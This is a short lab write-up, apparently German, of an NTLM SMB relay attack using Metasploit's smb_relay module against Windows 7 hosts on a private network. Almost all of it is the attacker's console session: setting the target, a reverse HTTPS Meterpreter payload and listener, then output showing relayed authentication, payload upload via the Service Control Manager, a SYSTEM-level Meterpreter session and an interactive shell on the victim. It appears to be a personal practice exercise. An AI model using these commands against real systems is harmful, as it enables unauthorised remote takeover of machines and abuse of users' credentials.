# SMB Relay
## Systeme
- Angreifer: Kali Linux (192.168.178.39)
- Opfer: Windows 7 Pro Service Pack 2 (192.168.178.44)
- Server: Windows 7 Home Service Pack 2 (192.168.178.54)

## Metasploit Angriff
```
msf > use exploit/windows/smb/smb_relay 
msf exploit(smb_relay) > set SMBhOST 192.168.178.44
SMBhOST => 192.168.178.44

msf exploit(smb_relay) > set PayLOAD windows/meterpreter/reverse_https
PayLOAD => windows/meterpreter/reverse_https

msf exploit(smb_relay) > set LHOST 192.168.178.39
LHOST => 192.168.178.39

msf exploit(smb_relay) > exploit


[*] Exploit running as background job 0.

[*] Started HTTPS reverse handler on https://192.168.178.39:8443
msf exploit(smb_relay) > [*] Server started.
[*] Sending NTLMSSP NEGOTIATE to 192.168.178.44
[*] Extracting NTLMSSP CHALLENGE from 192.168.178.44
[*] Forwarding the NTLMSSP CHALLENGE to 192.168.178.54:49212
[*] Extracting the NTLMSSP AUTH resolution from 192.168.178.54:49212, and sending Logon Failure response
[*] Forwarding the NTLMSSP AUTH resolution to 192.168.178.44
[+] SMB auth relay against 192.168.178.44 succeeded
[*] Connecting to the defined share...
[*] Regenerating the payload...
[*] Uploading payload...
[*] Created \eZDreHHc.exe...
[*] Connecting to the Service Control Manager...
[*] Obtaining a service manager handle...
[*] Creating a new service...
[*] Closing service handle...
[*] Opening service...
[*] Starting the service...
[*] Removing the service...
[*] Closing service handle...
[*] Deleting \eZDreHHc.exe...
[*] Sending NTLMSSP NEGOTIATE to 192.168.178.44
[*] Extracting NTLMSSP CHALLENGE from 192.168.178.44
[*] Forwarding the NTLMSSP CHALLENGE to 192.168.178.54:49212
[*] Extracting the NTLMSSP AUTH resolution from 192.168.178.54:49212, and sending Logon Failure response
[*] Forwarding the NTLMSSP AUTH resolution to 192.168.178.44
[+] SMB auth relay against 192.168.178.44 succeeded
[*] Ignoring request from 192.168.178.44, attack already in progress.
[*] Sending NTLMSSP NEGOTIATE to 192.168.178.44
[*] Extracting NTLMSSP CHALLENGE from 192.168.178.44
[*] Forwarding the NTLMSSP CHALLENGE to 192.168.178.54:49212
[*] Extracting the NTLMSSP AUTH resolution from 192.168.178.54:49212, and sending Logon Failure response
[*] Forwarding the NTLMSSP AUTH resolution to 192.168.178.44
[+] SMB auth relay against 192.168.178.44 succeeded
[*] Ignoring request from 192.168.178.44, attack already in progress.
[*] Sending NTLMSSP NEGOTIATE to 192.168.178.44
[*] Extracting NTLMSSP CHALLENGE from 192.168.178.44
[*] Forwarding the NTLMSSP CHALLENGE to 192.168.178.54:49212
[*] Extracting the NTLMSSP AUTH resolution from 192.168.178.54:49212, and sending Logon Failure response
[*] Forwarding the NTLMSSP AUTH resolution to 192.168.178.44
[+] SMB auth relay against 192.168.178.44 succeeded
[*] Ignoring request from 192.168.178.44, attack already in progress.
[*] https://192.168.178.39:8443 handling request from 192.168.178.44; (UUID: l2ub22od) Staging x86 payload (180311 bytes) ...
[*] Meterpreter session 1 opened (192.168.178.39:8443 -> 192.168.178.44:50790) at 2017-12-20 11:02:58 -0500

msf exploit(smb_relay) > sessions -l

Active sessions
===============

  Id  Type                     Information                      Connection
  --  ----                     -----------                      ----------
  1   meterpreter x86/windows  NT-AUTORIT_T\SYSTEM @ VICTIM-PC  192.168.178.39:8443 -> 192.168.178.44:50790 (192.168.178.44)

msf exploit(smb_relay) > sessions -i 1

[*] Starting interaction with 1...

meterpreter > shell

Process 2748 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. Alle Rechte vorbehalten.

C:\Windows\system32>

```